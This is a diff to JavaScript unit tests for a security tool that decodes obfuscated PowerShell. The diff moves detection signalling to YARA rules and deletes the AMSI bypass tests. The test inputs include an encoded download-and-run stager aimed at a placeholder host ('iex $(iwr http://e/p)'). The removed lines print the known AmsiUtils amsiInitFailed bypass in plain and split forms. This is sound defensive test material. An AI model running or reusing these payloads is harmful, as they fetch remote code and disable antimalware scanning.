@@ -83,14 +83,17 @@ test('ps -EncodedCommand: does NOT fire on random short base64', () => {
   assert.equal(enc.length, 0, `expected suppression on noise; got: ${JSON.stringify(enc)}`);
 });
 
-test('ps -EncodedCommand: carries _patternIocs mirror for risk escalation', () => {
+test('ps -EncodedCommand: _patternIocs stripped in cull (YARA owns detection)', () => {
+  // The decoder still decodes; detection signalling moved to the YARA
+  // rule `PowerShell_Encoded_Command` in script-threats.yar.
   const inner = 'iex $(iwr http://e/p)';
   const b64 = toB64Utf16LE(inner);
   const text = `powershell.exe -enc ${b64}`;
   const cands = d._findCommandObfuscationCandidates(text, {});
   const enc = pick(cands, c => /EncodedCommand/.test(c.technique));
-  assert.ok(enc[0]._patternIocs && enc[0]._patternIocs.length >= 1);
-  assert.match(enc[0]._patternIocs[0].url, /T1059\.001|stager/i);
+  assert.ok(enc.length >= 1, 'decoder still produces cleartext');
+  assert.ok(!enc[0]._patternIocs || enc[0]._patternIocs.length === 0,
+    '_patternIocs must be empty post-cull — YARA carries the detection');
 });
 
 // ── 2. [char]N + [char]N reassembly ──────────────────────────────────────
@@ -158,15 +161,16 @@ test('ps -bxor inline-key: decodes printable payload', () => {
   assert.match(bx[0].deobfuscated, /Invoke-Expression/);
 });
 
-test('ps -bxor inline-key: accepts 0xHH key + emits IOC.PATTERN mirror', () => {
+test('ps -bxor inline-key: _patternIocs stripped in cull (decoder still decodes)', () => {
   const pl = 'powershell.exe -Command whoami';
   const key = 0x42;
   const nums = [...pl].map(c => (c.charCodeAt(0) ^ key).toString()).join(',');
   const text = `@(${nums}) | % { $_ -bxor 0x${key.toString(16)} }`;
   const cands = d._findCommandObfuscationCandidates(text, {});
   const bx = pick(cands, c => /-bxor/.test(c.technique));
-  assert.ok(bx.length >= 1);
-  assert.ok(bx[0]._patternIocs && bx[0]._patternIocs[0].url.includes('XOR'));
+  assert.ok(bx.length >= 1, 'decoder still produces cleartext');
+  assert.ok(!bx[0]._patternIocs || bx[0]._patternIocs.length === 0,
+    '_patternIocs must be empty post-cull');
 });
 
 // ── 5. [scriptblock]::Create(…).Invoke() ─────────────────────────────────
@@ -190,22 +194,15 @@ test('ps [scriptblock]::Create: ScriptBlock casing + fully-qualified form', () =
   assert.ok(sb.length >= 1);
 });
 
-// ── 6. AMSI bypass ───────────────────────────────────────────────────────
-
-test('ps AMSI bypass: recognises canonical AmsiUtils.amsiInitFailed pattern', () => {
-  const text = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
-  const cands = d._findCommandObfuscationCandidates(text, {});
-  const amsi = pick(cands, c => /AMSI/.test(c.technique));
-  assert.ok(amsi.length >= 1, `expected AMSI candidate; got: ${JSON.stringify(host(cands))}`);
-  assert.equal(amsi[0]._patternIocs[0].severity, 'critical');
-});
-
-test('ps AMSI bypass: matches concat-split `amsi`+`InitFailed` form', () => {
-  const text = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsi'+'InitFailed','NonPublic,Static')";
-  const cands = d._findCommandObfuscationCandidates(text, {});
-  const amsi = pick(cands, c => /AMSI/.test(c.technique));
-  assert.ok(amsi.length >= 1);
-});
+// ── 6. AMSI bypass — removed in the Deobfuscation cull ──────────────
+//
+// The "PowerShell AMSI Bypass" and "PowerShell AMSI/ETW Reflective
+// Patch" branches of cmd-obfuscation.js were deleted because they
+// re-emitted their input (the deobfuscated string was a restatement
+// of the canonical AMSI-disable call, not recovered cleartext). The
+// YARA rule `AMSI_ETW_Bypass` in src/rules/script-threats.yar now
+// carries the detection; its test coverage lives in the e2e fixture
+// for `examples/windows-scripts/ps-stealth-launcher.ps1`.
 
 // ── 7. CMD set /a arithmetic-to-character ────────────────────────────────
 
